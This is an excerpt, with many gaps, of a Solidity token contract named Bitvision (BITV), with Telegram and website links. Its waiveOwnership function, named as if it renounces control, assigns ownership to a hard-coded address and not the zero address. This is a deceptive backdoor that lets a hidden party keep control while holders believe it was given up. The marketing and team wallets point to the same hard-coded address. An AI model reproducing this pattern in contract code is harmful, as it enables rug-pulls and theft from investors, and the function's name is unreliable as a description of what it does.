...
/**
Telegram : https://t.me/BitvisionBsc
Website : https://bitvision.website/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA908d7e71200645712Ea959390aDddd1D680122f);
    }
...
contract Bitvision is Context, IERC20, Ownable {
    ...
    string private _symbol = "BITV";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7b702b7462D51efe318B45c289e0d78490d78F42);
    address payable public teamWalletAddress = payable(0x7b702b7462D51efe318B45c289e0d78490d78F42);
